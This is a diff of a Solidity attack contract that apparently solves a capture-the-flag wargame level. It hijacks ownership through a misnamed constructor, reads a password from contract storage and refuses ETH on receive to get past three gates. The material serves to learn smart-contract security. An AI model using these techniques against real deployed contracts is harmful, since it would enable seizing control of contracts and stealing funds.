@@ -35,11 +35,12 @@ await web3.eth.getStorageAt("0x...your trick address here", 2);
 */
 
 contract GateSkipperThree {
-    IKeeper private keeper =
-        IKeeper(0xe05Caa08305692ea6Bb2DB43E4c96a1e7A51FDB0);
+    IKeeper public immutable keeper;
     address public trick;
 
-    constructor() payable {
+    constructor(address _keeper) payable {
+        keeper = IKeeper(_keeper);
+        // Deploy SimpleTrick
         keeper.createTrick();
         trick = keeper.trick();
     }
@@ -49,14 +50,13 @@ contract GateSkipperThree {
         keeper.construct0r();
         require(keeper.owner() == address(this), "Contract isn't owner!");
 
-        // Gate 2: Deploy SimpleTrick and get password
+        // Gate 2: Call getAllowance to get password
         keeper.getAllowance(uint256(_password));
         require(keeper.allowEntrance(), "allowEntrance isn't true!");
 
-        // Gate 3: deposit to keeper but revert on receive
+        // Gate 3: Deposit to keeper but revert on receive
         (bool success, ) = address(keeper).call{value: 0.0011 ether}("");
         require(success, "Deposit failed!");
-        require(address(keeper).balance == 0.0011 ether, "Deposit failed!");
 
         keeper.enter();
         require(keeper.entrant() == msg.sender, "Attack failed!");
@@ -66,5 +66,3 @@ contract GateSkipperThree {
         require(true == false);
     }
 }
-
-// 🎉 Level completed! 🎉
